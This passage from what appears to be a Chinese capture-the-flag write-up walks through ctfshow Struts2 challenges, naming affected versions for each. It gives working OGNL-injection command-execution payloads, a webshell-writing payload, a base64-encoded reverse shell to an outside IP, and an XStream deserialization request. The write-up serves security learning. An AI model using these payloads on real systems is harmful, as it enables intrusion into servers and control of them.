class="selector-class">.flush</span>(),<span class="selector-id">#ot</span><span class="selector-class">.close</span>()&#125;</span><br></pre></td></tr></table></figure>

<p>写入webshell：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:$&#123;<span class="selector-id">#context</span><span class="selector-attr">[<span class="string">&quot;xwork.MethodAccessor.denyMethodExecution&quot;</span>]</span>=false,#f=#_memberAccess<span class="selector-class">.getClass</span>()<span class="selector-class">.getDeclaredField</span>(<span class="string">&quot;allowStaticMethodAccess&quot;</span>),<span class="selector-id">#f</span><span class="selector-class">.setAccessible</span>(true),<span class="selector-id">#f</span><span class="selector-class">.set</span>(#_memberAccess,true),#a=<span class="selector-id">#context</span><span class="selector-class">.get</span>(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletRequest&quot;</span>),#b=new java<span class="selector-class">.io</span><span class="selector-class">.FileOutputStream</span>(new java<span class="selector-class">.lang</span><span class="selector-class">.StringBuilder</span>(<span class="selector-id">#a</span><span class="selector-class">.getRealPath</span>(<span class="string">&quot;/&quot;</span>))<span class="selector-class">.append</span>(@java<span class="selector-class">.io</span>.File@separator)<span class="selector-class">.append</span>(<span class="string">&quot;1.jspx&quot;</span>)<span class="selector-class">.toString</span>()),<span class="selector-id">#b</span><span class="selector-class">.write</span>(<span class="selector-id">#a</span><span class="selector-class">.getParameter</span>(<span class="string">&quot;t&quot;</span>)<span class="selector-class">.getBytes</span>()),<span class="selector-id">#b</span><span class="selector-class">.close</span>(),#genxor=<span class="selector-id">#context</span><span class="selector-class">.get</span>(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>)<span class="selector-class">.getWriter</span>(),<span class="selector-id">#genxor</span><span class="selector-class">.println</span>(<span class="string">&quot;BINGO&quot;</span>),<span class="selector-id">#genxor</span><span class="selector-class">.flush</span>(),<span class="selector-id">#genxor</span><span class="selector-class">.close</span>()&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们反弹shell的poc</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/S2-<span class="number">016</span>/<span class="keyword">default</span>.action?redirect%3A%<span class="number">24</span>%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%<span class="number">22</span>%<span class="number">5D</span>%3Dfalse%2C%<span class="number">23f</span>%<span class="number">3D</span>%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%<span class="number">22</span>)%2C%<span class="number">23f</span>.setAccessible(<span class="literal">true</span>)%2C%<span class="number">23f</span>.set(%23_memberAccess%2Ctrue)%2C%23a%<span class="number">3D</span>%40java.lang.Runtime%40getRuntime().exec(%22bash%<span class="number">20</span>-c%<span class="number">20</span>%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjQuMjIzLjI1LjE4Ni85OTk5IDA%2BJjE%<span class="number">3D</span>%<span class="number">7D</span>%7C%7Bbase64%2C-d%<span class="number">7D</span>%7C%7Bbash%2C-i%<span class="number">7D</span>%<span class="number">22</span>).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%<span class="number">23d</span>%3Dnew%20char%5B5000%<span class="number">5D</span>%2C%23c.read(%<span class="number">23d</span>)%2C%23genxor%<span class="number">3D</span>%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%<span class="number">22</span>).getWriter()%2C%23genxor.println(%<span class="number">23d</span>)%2C%23genxor.flush()%2C%23genxor.close()%<span class="number">7D</span></span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/java--ctfshow/image-20260224112806685.png" alt="image-20260224112806685"></p>
<h1 id="web288"><a href="#web288" class="headerlink" title="web288"></a>web288</h1><h2 id="S2-019"><a href="#S2-019" class="headerlink" title="#S2-019"></a>#S2-019</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_31679787/article/details/102658406">https://blog.csdn.net/qq_31679787/article/details/102658406</a></p>
<p>这个漏洞网上资料倒是不多</p>
<p>poc</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?debug=command&amp;expression=%<span class="number">23f</span>%<span class="number">3D</span>%23_memberAccess.getClass().getDeclaredField(%27allowStaticMethodAccess%<span class="number">27</span>)%2C%<span class="number">23f</span>.setAccessible(<span class="literal">true</span>)%2C%<span class="number">23f</span>.set(%23_memberAccess%2Ctrue)%2C%23req%<span class="number">3D</span>%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23resp%<span class="number">3D</span>%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%<span class="number">3D</span>(<span class="keyword">new</span>%20java.lang.ProcessBuilder(<span class="keyword">new</span>%20java.lang.String%5B%<span class="number">5D</span>%7B<span class="string">&#x27;whoami&#x27;</span>%<span class="number">7D</span>)).start()%2C%23b%<span class="number">3D</span>%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%<span class="number">23d</span>%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B1000%<span class="number">5D</span>%2C%<span class="number">23d</span>.read(%23e)%2C%23resp.println(%23e)%2C%23resp.close()</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/java--ctfshow/image-20260224113659371.png" alt="image-20260224113659371"></p>
<p>后面也是直接打就行了，记得改一下字节数组的大小</p>
<h1 id="web289"><a href="#web289" class="headerlink" title="web289"></a>web289</h1><h2 id="S2-029？"><a href="#S2-029？" class="headerlink" title="#S2-029？"></a>#S2-029？</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zr1213159840/article/details/122511489">https://blog.csdn.net/zr1213159840/article/details/122511489</a></p>
<p>但是用poc并没有打通，转向使用更高版本的漏洞POC吧，用工具检测发现045可以打</p>
<p><img src="/../image/achieve/202411/java--ctfshow/image-20260224115354721.png" alt="image-20260224115354721"></p>
<h1 id="web290"><a href="#web290" class="headerlink" title="web290"></a>web290</h1><h2 id="S2-032"><a href="#S2-032" class="headerlink" title="#S2-032"></a>#S2-032</h2><p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-032/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/struts2/s2-032/README.zh-cn.md</a></p>
<p>Struts2在开启了动态方法调用（Dynamic Method Invocation）的情况下，可以使用<code>method:&lt;name&gt;</code>的方式来调用名字是<code>&lt;name&gt;</code>的方法，而这个方法名将会进行OGNL表达式计算，导致远程命令执行漏洞。</p>
<h2 id="影响版本-9"><a href="#影响版本-9" class="headerlink" title="影响版本"></a>影响版本</h2><p>2.3.20 - 2.3.28 (except 2.3.20.3 and 2.3.24.3)</p>
<p>POC</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?method:%23_memberAccess%<span class="number">3d</span><span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>,%23res%<span class="number">3d</span>%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%<span class="number">5D</span>),%23w%<span class="number">3d</span>%23res.getWriter(),%23s%3dnew+java.util.Scanner(<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(%23parameters.cmd%5B0%<span class="number">5D</span>).getInputStream()).useDelimiter(%23parameters.pp%5B0%<span class="number">5D</span>),%23str%<span class="number">3d</span>%23s.hasNext()%<span class="number">3f</span>%23s.next()%3a%23parameters.ppp%5B0%<span class="number">5D</span>,%23w.print(%23str),%23w.close(),<span class="number">1</span>?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%<span class="number">20</span>&amp;encoding=UTF-<span class="number">8</span>&amp;cmd=id</span><br></pre></td></tr></table></figure>

<p>随便点击一个会跳转到<code>/S2-032/memoshow.action</code>，在后面打入poc就行了</p>
<p><img src="/../image/achieve/202411/java--ctfshow/image-20260224120042326.png" alt="image-20260224120042326"></p>
<h1 id="web291"><a href="#web291" class="headerlink" title="web291"></a>web291</h1><h2 id="S2-037"><a href="#S2-037" class="headerlink" title="#S2-037"></a>#S2-037</h2><p>其实我觉得这个应该是S2-037而不是S2-033</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/jinqi520/p/10815048.html">https://www.cnblogs.com/jinqi520/p/10815048.html</a></p>
<p> S2-033漏洞和S2-032类似，也是由于开启了动态方法调用，Rest插件中获取action mapper作为方法名，其执行的方法名可控，导致了ognl表达式注入。</p>
<p>S2-037是S2-033的一个绕过，不需要开启动态方法调用就可以进行rce。RestActionMapper类的getmapping比DefaultActionMapper中多了后面一部分，也就是rest插件支持actionName&#x2F;id&#x2F;methodName这种方式解析uri，且并不用开启动态方法调用。</p>
<h2 id="影响版本（不确定）"><a href="#影响版本（不确定）" class="headerlink" title="影响版本（不确定）"></a>影响版本（不确定）</h2><p>Struts 2.3.20 – Struts 2.3.28 (不包括 2.3.20.3和 2.3.24.3)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/S2-<span class="number">033</span>/orders/<span class="number">3</span>/%23_memberAccess%<span class="number">3d</span>%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2c%23process%<span class="number">3d</span>%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5b0%<span class="number">5d</span>)%2c%23ros%<span class="number">3d</span>(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2c%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2c%23ros)%2c%23ros.flush()%2c%23xx%3d123%2c%23xx.toString.json?command=whoami</span><br></pre></td></tr></table></figure>

<p>command改成需要执行的命令就可以了</p>
<p><img src="/../image/achieve/202411/java--ctfshow/image-20260224121125356.png" alt="image-20260224121125356"></p>
<h1 id="web292"><a href="#web292" class="headerlink" title="web292"></a>web292</h1><h2 id="S2-037-1"><a href="#S2-037-1" class="headerlink" title="#S2-037"></a>#S2-037</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64118193/article/details/147288963">https://blog.csdn.net/m0_64118193/article/details/147288963</a></p>
<p>和上面的一样，直接打就行</p>
<h2 id="影响版本-10"><a href="#影响版本-10" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache struts 2.3.20 - 2.3.28.1 版本使用了REST插件的用户</p>
<h1 id="web293"><a href="#web293" class="headerlink" title="web293"></a>web293</h1><h2 id="S2-045"><a href="#S2-045" class="headerlink" title="#S2-045"></a>#S2-045</h2><p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-045/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/struts2/s2-045/README.zh-cn.md</a></p>
<p>p牛只给了测试poc，没有给执行命令的poc</p>
<p>看这篇文章吧：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/13335134.html">https://www.cnblogs.com/zzjdbk/p/13335134.html</a></p>
<p>在使用基于Jakarta插件的文件上传功能时，恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p>
<h2 id="影响版本-11"><a href="#影响版本-11" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10</p>
<p>找到一个可以上传文件点<br><img src="/../image/achieve/202411/java--ctfshow/image-20260224123448604.png" alt="image-20260224123448604"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type:<span class="string">&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;whoami&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/java--ctfshow/image-20260224123542662.png" alt="image-20260224123542662"></p>
<h1 id="web294"><a href="#web294" class="headerlink" title="web294"></a>web294</h1><h2 id="S2-046"><a href="#S2-046" class="headerlink" title="#S2-046"></a>#S2-046</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64777251/article/details/137837795">https://blog.csdn.net/m0_64777251/article/details/137837795</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-046/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/struts2/s2-046/README.zh-cn.md</a></p>
<p>与s2-045类似，但是输入点在文件上传的filename值位置，并需要使用<code>\x00</code>截断。</p>
<h2 id="影响版本-12"><a href="#影响版本-12" class="headerlink" title="影响版本"></a>影响版本</h2><p>2.0.0 &lt;&#x3D; Struts2 &lt;&#x3D; 2.3.32</p>
<p>POC</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;(#_=<span class="string">&#x27;multipart/form-data&#x27;</span>).(#dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.OgnlUtil<span class="meta">@class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=<span class="string">&#x27;whoami&#x27;</span>).(#iswin=(<span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&#x27;os.name&#x27;)</span>.toLowerCase().contains(<span class="string">&#x27;win&#x27;</span>))).(#cmds=(#iswin?&#123;<span class="string">&#x27;cmd.exe&#x27;</span>,<span class="string">&#x27;/c&#x27;</span>,#cmd&#125;:&#123;<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,#cmd&#125;)).(#p=<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(<span class="literal">true</span>)).(#process=#p.start()).(#ros=(<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse()</span>.getOutputStream())).(<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@copy(#process.getInputStream(),#ros)</span>).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure>

<p>另外还需要在b前面插入一个00进行截断</p>
<p><img src="/../image/achieve/202411/java--ctfshow/image-20260224124930826.png" alt="image-20260224124930826"></p>
<p><img src="/../image/achieve/202411/java--ctfshow/image-20260224124916384.png" alt="image-20260224124916384"></p>
<p>当然也是可以直接在Content-Type里面打的，不过我当时并没有尝试</p>
<h1 id="web295"><a href="#web295" class="headerlink" title="web295"></a>web295</h1><h2 id="S2-048"><a href="#S2-048" class="headerlink" title="#S2-048"></a>#S2-048</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/341609.html">https://www.freebuf.com/vuls/341609.html</a></p>
<p><strong>漏洞存在的路径 &#x2F;integration&#x2F;saveGangster.action，在路径中提交Gangster Name传入OGNL表达式时，点击Submit提交后发现OGNL表达式被解析执行</strong></p>
<p>例如传入<code>$&#123;8*8&#125;</code></p>
<p><img src="/../image/achieve/202411/java--ctfshow/image-20260224125711178.png" alt="image-20260224125711178"></p>
<h2 id="影响版本-13"><a href="#影响版本-13" class="headerlink" title="影响版本"></a>影响版本</h2><p>2.0.0 - 2.3.32</p>
<p>POC</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.OgnlUtil<span class="meta">@class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(&#x27;whoami&#x27;).getInputStream())</span>).(#q)&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/java--ctfshow/image-20260224125932153.png" alt="image-20260224125932153"></p>
<p>没法执行env，并且弹shell也弹不上去</p>
<h1 id="web296"><a href="#web296" class="headerlink" title="web296"></a>web296</h1><h2 id="S2-052"><a href="#S2-052" class="headerlink" title="#S2-052"></a>#S2-052</h2><p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-052/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/struts2/s2-052/README.zh-cn.md</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/208654.html">https://www.freebuf.com/articles/web/208654.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Jietewang/article/details/109091898">https://blog.csdn.net/Jietewang/article/details/109091898</a></p>
<p>Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，存在安全隐患，可造成远程命令执行。</p>
<h2 id="影响版本-14"><a href="#影响版本-14" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12</p>
<p>poc</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/orders/3/edit</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>your-ip:8080</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>2415</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&quot;javax.crypto.CipherInputStream&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">cipher</span> <span class="attr">class</span>=<span class="string">&quot;javax.crypto.NullCipher&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">initialized</span>&gt;</span>false<span class="tag">&lt;/<span class="name">initialized</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">opmode</span>&gt;</span>0<span class="tag">&lt;/<span class="name">opmode</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">serviceIterator</span> <span class="attr">class</span>=<span class="string">&quot;javax.imageio.spi.FilterIterator&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">&quot;javax.imageio.spi.FilterIterator&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">&quot;java.util.Collections$EmptyIterator&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;<span class="name">next</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                      <span class="tag">&lt;<span class="name">command</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>touch<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>/tmp/success<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                      <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                      <span class="tag">&lt;<span class="name">redirectErrorStream</span>&gt;</span>false<span class="tag">&lt;/<span class="name">redirectErrorStream</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;/<span class="name">next</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;/<span class="name">iter</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">&quot;javax.imageio.ImageIO$ContainsFilter&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;<span class="name">method</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                      <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                      <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                      <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;<span class="name">name</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;<span class="name">next</span> <span class="attr">class</span>=<span class="string">&quot;string&quot;</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">next</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;/<span class="name">serviceIterator</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">lock</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;/<span class="name">cipher</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder$NullInputStream&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">ibuffer</span>&gt;</span><span class="tag">&lt;/<span class="name">ibuffer</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">done</span>&gt;</span>false<span class="tag">&lt;/<span class="name">done</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">ostart</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ostart</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">ofinish</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ofinish</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">closed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">closed</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">&quot;../jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>但是这个漏洞并不会回显，所以需要反弹shell</p>
